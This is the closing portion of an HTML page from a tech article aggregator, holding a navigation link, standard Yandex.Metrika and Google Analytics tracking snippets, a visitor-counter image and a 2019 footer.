<li><a href="../id466295/index.html">Cache Fallback tanpa rasa sakit pada Scala</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>